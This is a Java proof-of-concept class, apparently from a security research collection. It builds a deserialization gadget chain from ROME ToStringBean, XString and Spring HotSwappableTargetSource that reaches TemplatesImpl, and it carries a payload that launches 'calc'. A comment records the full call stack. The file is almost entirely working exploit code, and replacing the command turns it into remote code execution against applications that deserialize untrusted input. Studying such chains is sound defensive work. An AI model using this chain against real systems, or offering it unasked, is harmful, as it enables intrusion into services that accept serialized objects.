package com.javasec.pocs.rome;

import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.util.HashMap;

/**
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * equals:104, HotSwappableTargetSource (org.springframework.aop.target)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * main:20, XstringC (com.javasec.pocs.rome)
 */
public class XstringC {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("123"));
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        // 执行序列化与反序列化，并且返回序列化数据
        HashMap<Object, Object> map = new HashMap<>();
        map.put(h1,h1);
        map.put(h2,h2);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(map));
    }
}
